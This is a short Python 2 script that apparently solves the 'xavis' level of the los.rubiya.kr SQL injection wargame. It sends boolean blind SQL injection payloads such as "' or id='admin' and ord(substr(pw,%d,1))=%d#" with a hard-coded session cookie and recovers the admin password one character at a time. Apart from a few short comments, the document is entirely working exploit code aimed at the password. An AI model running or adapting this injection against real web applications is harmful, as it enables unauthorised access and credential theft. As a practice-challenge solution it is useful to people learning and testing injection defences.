#-*-encoding:utf8-*-
import requests

pw=""
pw_length=0

url = "http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php"

headers = {
    "cookie": "PHPSESSID=its787g35mmari3i8vd2ualmh3"
    
}

#Find admin pw length
#12
'''
for i in range(1,100):
    print "[Try: Find PW Length:%d]" % i
    params = {
        "pw":"' or id='admin' and length(pw)=%d#" % i 
    }
    res = requests.get(url, params=params, headers=headers)
    
    if "Hello admin" in res.content:
        pw_length = i
        print "Find admin PW Length:", pw_length
        break
'''

#Find admin PW 그대로 10진수로할 때는 안나옴 플래그:우왕굳
for i in range(1,11):
    for j in range(128,255):
        params = {
            "pw":"' or id='admin' and ord(substr(pw,%d,1))=%d#" % (i,j)
        }
        try:
            #print "[Try: index: %d value:%d]" % (i,j)
            res = requests.get(url, params=params, headers=headers)
        
            if "Hello admin" in res.content:
                print "Find! index: %d value:%d" % (i,j)
                print unichr(j).encode("utf-8").decode("utf-8")
                pw += unichr(j).encode("utf-8").decode("utf-8")
                print pw
                break

        except Exception as e:
                j = j-1
                continue
print "pw", pw
